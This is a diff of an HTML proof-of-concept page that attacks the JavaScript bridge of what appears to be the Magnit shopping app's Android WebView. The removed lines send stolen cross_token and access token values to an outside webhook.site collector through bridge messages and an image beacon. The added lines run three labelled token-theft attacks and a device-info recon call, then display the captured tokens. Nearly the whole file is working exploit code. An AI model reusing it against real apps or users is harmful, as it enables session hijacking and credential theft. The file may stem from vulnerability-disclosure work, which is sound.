@@ -1,25 +1,178 @@
-<script>
-var WEBHOOK = 'https://webhook.site/52dbaa1f-6ce3-490d-b01b-32f3ed2b7fe9/b1075553-4052-48c4-b108-af094ad2defe';
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC — magnit://web JS Bridge</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: monospace;
+            background: #0d1117;
+            color: #c9d1d9;
+            padding: 16px;
+            font-size: 13px;
+        }
+        h1 {
+            color: #f85149;
+            font-size: 16px;
+            margin-bottom: 12px;
+            border-bottom: 1px solid #21262d;
+            padding-bottom: 8px;
+        }
+        .log-entry {
+            background: #161b22;
+            border: 1px solid #21262d;
+            border-radius: 6px;
+            padding: 10px 12px;
+            margin-bottom: 8px;
+            word-break: break-all;
+        }
+        .log-entry .label {
+            color: #f0883e;
+            font-weight: bold;
+            font-size: 11px;
+            text-transform: uppercase;
+            margin-bottom: 4px;
+        }
+        .log-entry .value {
+            color: #7ee787;
+        }
+        .log-entry .error {
+            color: #f85149;
+        }
+        .log-entry .time {
+            color: #8b949e;
+            font-size: 10px;
+            float: right;
+        }
+        #status {
+            background: #161b22;
+            border: 1px solid #21262d;
+            border-radius: 6px;
+            padding: 10px;
+            margin-bottom: 12px;
+            text-align: center;
+        }
+        #status.ok { border-color: #7ee787; }
+        #status.fail { border-color: #f85149; }
+    </style>
+</head>
+<body>
+    <h1>magnit://web JS Bridge PoC</h1>
+    <div id="status">Initializing...</div>
+    <div id="log"></div>
 
-// Вариант А: externalURL с cross_token
-Android.postMessage(JSON.stringify({
-    event: 'externalURL',
-    payload: {
-        url: WEBHOOK + '?steal=crosstoken&add_crosstoken=true'
+    <script>
+    var logDiv = document.getElementById('log');
+    var statusDiv = document.getElementById('status');
+
+    function ts() {
+        return new Date().toLocaleTimeString();
     }
-}));
 
-// Вариант Б: deeplink → webWithAuth → cross_token в URL
-Android.postMessage(JSON.stringify({
-    event: 'deeplink',
-    payload: {
-        url: 'magnit://webWithAuth?url=' + encodeURIComponent(WEBHOOK + '?steal=deeplink') + '&in_app=true'
+    function log(label, value, isError) {
+        var entry = document.createElement('div');
+        entry.className = 'log-entry';
+        entry.innerHTML =
+            '<span class="time">' + ts() + '</span>' +
+            '<div class="label">' + label + '</div>' +
+            '<div class="' + (isError ? 'error' : 'value') + '">' + value + '</div>';
+        logDiv.insertBefore(entry, logDiv.firstChild);
     }
-}));
 
-// Вариант В: updateToken → перехват через callback
-Android.postMessage(JSON.stringify({ event: 'updateToken' }));
-window.handleMobileMessage = function(data) {
-    new Image().src = WEBHOOK + '?steal=token&data=' + encodeURIComponent(data);
-};
-</script>
+    // === INFO ===
+    log('URL', window.location.href);
+    log('User-Agent', navigator.userAgent);
+    if (document.referrer) log('Referrer', document.referrer);
+
+    // === CHECK JS BRIDGE ===
+    var bridgeAvailable = (typeof Android !== 'undefined' && typeof Android.postMessage === 'function');
+
+    if (bridgeAvailable) {
+        statusDiv.textContent = 'JS Bridge Android.postMessage() — AVAILABLE';
+        statusDiv.className = 'ok';
+        log('JS Bridge', 'Android.postMessage() is accessible', false);
+    } else {
+        statusDiv.textContent = 'JS Bridge — NOT AVAILABLE (open via magnit://web?url=)';
+        statusDiv.className = 'fail';
+        log('JS Bridge', 'Android object not found. Page must be opened inside Magnit WebView via magnit://web?url=', true);
+    }
+
+    // === INTERCEPT handleMobileMessage ===
+    window.handleMobileMessage = function(data) {
+        log('handleMobileMessage', data);
+        try {
+            var parsed = JSON.parse(data);
+            if (parsed.token) {
+                log('ACCESS TOKEN CAPTURED', parsed.token);
+            }
+            if (parsed.type) {
+                log('Event Type', parsed.type);
+            }
+        } catch(e) {
+            log('Raw Data', data);
+        }
+    };
+
+    // === INTERCEPT cross_token FROM URL ===
+    var params = new URLSearchParams(window.location.search);
+    var crossToken = params.get('cross_token');
+    if (crossToken) {
+        log('CROSS TOKEN FROM URL', crossToken);
+    }
+
+    if (!bridgeAvailable) {
+        // Stop here if no bridge
+    } else {
+
+        // === ATTACK 1: externalURL + add_crosstoken ===
+        try {
+            Android.postMessage(JSON.stringify({
+                event: 'externalURL',
+                payload: {
+                    url: window.location.href.split('?')[0] + '?method=externalURL&add_crosstoken=true'
+                }
+            }));
+            log('Sent: externalURL', 'Requesting redirect with cross_token appended to this page URL');
+        } catch(e) {
+            log('externalURL', e.message, true);
+        }
+
+        // === ATTACK 2: deeplink → webWithAuth ===
+        try {
+            var targetUrl = window.location.href.split('?')[0] + '?method=deeplink_webWithAuth';
+            Android.postMessage(JSON.stringify({
+                event: 'deeplink',
+                payload: {
+                    url: 'magnit://webWithAuth?url=' + encodeURIComponent(targetUrl) + '&in_app=true'
+                }
+            }));
+            log('Sent: deeplink', 'magnit://webWithAuth → should reload this page with cross_token');
+        } catch(e) {
+            log('deeplink', e.message, true);
+        }
+
+        // === ATTACK 3: updateToken ===
+        try {
+            Android.postMessage(JSON.stringify({
+                event: 'updateToken'
+            }));
+            log('Sent: updateToken', 'Waiting for handleMobileMessage callback with token...');
+        } catch(e) {
+            log('updateToken', e.message, true);
+        }
+
+        // === RECON: options ===
+        try {
+            Android.postMessage(JSON.stringify({
+                event: 'options'
+            }));
+            log('Sent: options', 'Requesting device info...');
+        } catch(e) {
+            log('options', e.message, true);
+        }
+    }
+    </script>
+</body>
+</html>
